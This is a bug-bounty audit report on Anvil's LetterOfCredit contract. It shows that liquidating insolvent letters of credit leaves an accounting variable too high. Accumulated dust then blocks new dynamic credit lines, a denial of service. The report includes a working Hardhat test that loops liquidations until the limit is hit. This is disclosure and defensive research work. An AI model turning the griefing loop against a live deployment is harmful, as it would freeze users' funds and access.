# #36999 \[SC-Insight] Incomplete Adjustment of \`globalAmountInDynamicUse\` During LOC Liquidation Cause

**Submitted on Nov 21st 2024 at 21:15:09 UTC by @jovi for** [**Audit Comp | Anvil: Letters of Credit**](https://immunefi.com/audit-competition/audit-comp-anvil-letters-of-credit)

* **Report ID:** #36999
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/AcronymFoundation/anvil-contracts/blob/main/contracts/LetterOfCredit.sol>
* **Impacts:**
  * Temporary freezing of funds set to 48 hrs within the LetterOfCredit contract
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The \`globalAmountInDynamicUse\` is not decremented by the correct amount when insolvent LOCs are liquidated due to discrepancies in \`creditedTokenAmountToReceive\` calculations.

## Vulnerability Details

The issue arises in the \`\_calculateLiquidationContext\` function, due to how insolvent LOCs are handled. When converting the LOC, the following code snippet will be executed: \`\`\`solidity if (maxCreditedTokenAmountToReceive < \_loc.creditedTokenAmount) { if (\_requiredCreditedAmount != \_loc.creditedTokenAmount) revert PartialRedeemInsolvent(); return \_createLiquidationContextUsingAllClaimableCollateral(\_loc, maxCreditedTokenAmountToReceive); } \`\`\` When we call this function, the \`creditedTokenAmountToReceive\` value returned is the second argument. In this case, this argument is \`maxCreditedTokenAmountToReceive\`.

Since the LOC is insolvent, \`maxCreditedTokenAmountToReceive\` will never be equal to the originally credited token amount of the dynamic LOC. By returning a value for \`liquidationContext.creditedTokenAmountToReceive \`that is smaller than the original creditedTokenAmount at this call, the insolvent LOC is effectively turned into a static one. The issue is that the difference \`(originalCreditedTokenAmount - maxCreditedTokenAmountToReceive)\` is not removed from the \`globalAmountInDynamicUse\` storage due to the following snippet in the \`\_liquidateLOCCollateral\` function: \`\`\`solidity creditedTokens\[creditedTokenAddress].globalAmountInDynamicUse -= liquidationContext .creditedTokenAmountToReceive; \`\`\`

When the dynamic LOC was created, \`globalAmountInDynamicUse\` was incremented by the credited token amount, but during liquidation, the full credited token amount is not being removed. Since the LOC has become static, it no longer affects \`globalAmountInDynamicUse\`.

Over time, these dust amounts accumulate and can cause a Denial of Service (DoS) on the creation of new LOCs because of how the creation of new dynamic LOCs is processed. The \`\_validateAndUpdateCreditedTokenUsageForDynamicLOCCreation\` function ensures the credited amount in use is within certain bounds: \`\`\`solidity uint256 newCreditedAmountInUse = creditedToken.globalAmountInDynamicUse + \_creditedTokenAmount; if (newCreditedAmountInUse > creditedToken.globalMaxInDynamicUse) revert GlobalCreditedTokenMaxInUseExceeded(creditedToken.globalMaxInDynamicUse, newCreditedAmountInUse);

\`\`\`

## Impact Details

The \`globalAmountInDynamicUse\` tracking is not correctly updated during liquidations. This can lead to a DoS on the creation of new dynamic LOCs as the \`globalAmountInDynamicUse\` value will incorrectly exceed the allowed limit, preventing new LOCs from being created.

## Proof of Concept

## Proof of concept

The following POC first executes multiple liquidations in order to accumulate gather dust at the \`globalAmountInDynamicUse\` storage. It logs the amounts of dust accumulated through each iteration. The following POC is structured in iterations that incrementally adjust the \`globalAmountInDynamicUse\` by summing dust amounts. Each iteration is comprised of the following steps:

* Set the price to an initial value.
* Create a dynamic LOC with a specific collateral and credited amount.
* Modify the price oracle to make the LOC insolvent.
* Trigger liquidation using \`convertLOC\`.
* Observe the unadjusted \`globalAmountInDynamicUse\`. The POC finishes by emitting a \`GlobalCreditedTokenMaxInUseExceeded\` error, as the dust amounts accumulated become so big users cannot create new LOCs anymore at iteration 184. The output should look like this: \`\`\`

1. LetterOfCredit Should demonstrate the globalAmountInDynamicUse is not fully removed during LOC conversions: Error: VM Exception while processing transaction: reverted with custom error 'GlobalCreditedTokenMaxInUseExceeded(100000000000000000000000, 100238621759259259259416)' \`\`\`

Paste the following code as a test at the createDynamicLOC.ts file: \`\`\`typescript it('Should demonstrate the globalAmountInDynamicUse is not fully removed during LOC conversions', async function () { // Load the initial setup const { creator, beneficiary, vault, letterOfCredit, creditedToken, collateralToken, priceOracle, other, } = await loadFixture(baseSetup); // loop this 10 times for (let i = 0; i< 200; i++) { // Mint credited tokens for \`other\` and approve the \`letterOfCredit\` const creditedTokenAmount = 1\_000\_000n \* 10n \*\* BigInt(await creditedToken.decimals()); await creditedToken.mint(await beneficiary.getAddress(), creditedTokenAmount); await creditedToken.connect(beneficiary).approve(await letterOfCredit.getAddress(), creditedTokenAmount);

```
// Calculate credited and collateral token amounts
const creditedTokenAmountToLOC &#x3D; BigInt((await letterOfCredit.getCreditedToken(await creditedToken.getAddress())).maxPerDynamicLOC);

const collateralTokenAmountToLOC &#x3D; (4n / 3n * creditedTokenAmountToLOC) / 1_000_000_000_000n;

// Approve collateral token and deposit to the vault
await collateralToken.connect(creator).approve(await vault.getAddress(), collateralTokenAmountToLOC);
await vault
    .connect(creator)
    .depositToAccount(await creator.getAddress(), [await collateralToken.getAddress()], [collateralTokenAmountToLOC]);

// Create allowance signature for LOC
const allowanceSignature &#x3D; await getModifyCollateralizableTokenAllowanceSignature(
    creator,
    (await vault.runner?.provider?.getNetwork())?.chainId ?? 0,
    await letterOfCredit.getAddress(),
    await collateralToken.getAddress(),
    collateralTokenAmountToLOC,
    await vault.nonces(
        await creator.getAddress(),
        await vault.COLLATERALIZABLE_TOKEN_ALLOWANCE_ADJUSTMENT_TYPEHASH()
    ),
    await vault.getAddress()
);

// Update price in the price oracle so that is always starts an iteration with the same price.
const abiCoder &#x3D; new AbiCoder();
let oracleData &#x3D; abiCoder.encode([&#x27;uint256&#x27;, &#x27;int32&#x27;], [4n, 12n]);
await priceOracle.updatePrice(
    await collateralToken.getAddress(),
    await creditedToken.getAddress(),
    oracleData
);

// Create LOC
const expirationSeconds &#x3D; await lastBlockTime(+3600);
const tx &#x3D; await letterOfCredit.connect(creator).createDynamicLOC(
    await beneficiary.getAddress(),
    await collateralToken.getAddress(),
    collateralTokenAmountToLOC,
    await creditedToken.getAddress(),
    creditedTokenAmountToLOC,
    expirationSeconds,
    ethers.getBytes(&#x27;0x&#x27;),
    allowanceSignature
);

// Set price to make LOC unhealthy
await priceOracle.setMockPrice(
    await collateralToken.getAddress(),
    await creditedToken.getAddress(),
    5n,
    11n,
    await lastBlockTime()
);

// Verify LOC creation and parameters
const ev &#x3D; await getEmittedEventArgs(tx, letterOfCredit, &#x27;LOCCreated&#x27;);
expect(ev.creator).to.equal(await creator.getAddress());
expect(ev.beneficiary).to.equal(await beneficiary.getAddress());
expect(ev.collateralTokenAddress).to.equal(await collateralToken.getAddress());
expect(ev.collateralTokenAmount.toString()).to.equal(collateralTokenAmountToLOC.toString());

const expectedClaimable &#x3D; amountBeforeFee(collateralTokenAmountToLOC, Number(await vault.withdrawalFeeBasisPoints()));
expect(ev.claimableCollateral.toString()).to.equal(expectedClaimable.toString());
expect(ev.creditedTokenAddress).to.equal(await creditedToken.getAddress());
expect(ev.creditedTokenAmount.toString()).to.equal(creditedTokenAmountToLOC.toString());
expect(ev.expirationTimestamp.toString()).to.equal(expirationSeconds.toString());

// Attempt to redeem LOC after liquidation
const tx2 &#x3D; await letterOfCredit.connect(beneficiary).convertLOC(
    ev.id,
    &#x27;0x0000000000000000000000000000000000000000&#x27;,
    ethers.getBytes(&#x27;0x&#x27;),
    ethers.getBytes(&#x27;0x&#x27;)
);
console.log(&quot;globalAmountInDynamicUse value after iteration #&quot;, i);
// its okay to access the 4th element of this array as we know it is the globalAmountInDynamicUse value
const creditedTokenStorage &#x3D; await letterOfCredit.getCreditedToken(creditedToken);
console.log(creditedTokenStorage.globalAmountInDynamicUse);
}
```

}); \`\`\`

Run the test with: \`\`\`shell npm run test \`\`\`

Of course, this POC displays a DOS impact when there aren't multiple parties using the system. Given that the protocol will handle many LOCs, it is fair to assume a much smaller amount of liquidations would need to happen to reach a similar state -> as there will be a bigger legitimate values for the globalAmountInDynamicUse storage value.
